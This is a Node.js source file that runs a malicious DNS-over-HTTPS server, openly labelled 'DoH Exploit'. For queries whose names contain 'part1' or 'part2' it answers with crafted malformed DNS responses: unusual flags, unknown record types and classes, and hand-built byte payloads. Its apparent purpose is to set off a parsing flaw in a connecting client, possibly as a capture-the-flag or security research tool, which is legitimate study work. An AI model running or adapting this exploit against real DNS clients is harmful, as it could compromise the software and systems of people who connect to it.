const express = require('express');
const bodyParser = require('body-parser');
const dnsPacket = require('dns-packet');

const BIND_ADDR = process.env.BIND_ADDR || '0.0.0.0';
const PORT = process.env.PORT || '1337';

const app = express();
app.use(bodyParser.raw({ type: '*/*' }));

function createAnswer(name, data) {
    data = Buffer.from(data)
    return dnsPacket.encode({
        id: 2570,
        type: 'query',
        flags: 4616,
        flag_qr: false,
        opcode: 'STATUS',
        flag_aa: false,
        flag_tc: true,
        flag_rd: false,
        flag_ra: false,
        flag_z: false,
        flag_ad: false,
        flag_cd: false,
        rcode: 'NXRRSET',
        questions: [],
        answers: [
            {
                type: 'UNKNOWN_16706',
                ttl: 1414793739,
                class: 'UNKNOWN_17219',
                flush: false,
                name,
                data,
            }
        ],
        authorities: [],
        additionals: [],
    });
}

app.post('/doh', (req, res) => {
    console.log(req.body)
    const msg = dnsPacket.decode(req.body);
    console.log('DNS:', msg);
    
    const name = msg.questions[0].name;
    let answer;
    if (name.includes('part1')) {
        answer = createAnswer(name, '\x00\x00\x00\x01\x00\x00\x00\x00');
    } else if (name.includes('part2')) {
        answer = createAnswer(name, 'A'.repeat(7) + '\x00' + 'AB' +'CCTT');
    } else {
        return res.status(404).end();
    }
    console.log(answer)
    res.send(answer);
});

app.listen(PORT, BIND_ADDR, () => {
    console.log(`DoH Exploit listening on ${BIND_ADDR}:${PORT}`);
});
